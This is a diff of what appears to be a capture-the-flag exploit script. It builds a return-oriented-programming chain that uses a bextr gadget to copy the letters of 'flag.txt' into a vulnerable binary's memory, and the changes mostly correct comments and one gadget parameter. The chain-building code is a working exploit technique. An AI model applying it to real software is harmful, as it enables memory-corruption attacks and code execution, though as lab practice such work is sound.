@@ -24,6 +24,7 @@ p = process(BINARY)
 ----------------------------------
 
 ; MOV AL, [RBX + AL]
+; adress of a letter of "flag.txt" must be in [RBX + AL]
 ; --> on first iteration AL = 0xb (puts return, saw with debug)
 ; --> RBX controlable with the bextr gadget
 
@@ -55,8 +56,8 @@ flag =  {
             '.': 0x4006A7,
             't': 0x4006CB,
             'x': 0x4006C8
+            # 't' is already there
         }
-
 
 rop = b"A" * 40
 
@@ -70,9 +71,11 @@ for i in range(len(flag_str)):
 
     # Gadget to control RBX
     rop += bextr_gadget
-    # Take the 0x17 (== 23) first bits and start at index 00
-    rop += p64(0x1700)
-    # Substractiin 0x3ef2 because it will be added in the gadget and al because it will be added in the next gadget
+    # Take the 0x20 (== 32) first bits and start at index 00
+    rop += p64(0x2000)
+    # Substracting :
+    # - 0x3ef2 because it will be added in the gadget
+    # - al because it will be added in the next gadget
     rop += p64(flag[flag_str[i]] - 0x3ef2 - al)
     
     # mov AL, [RBX + AL]
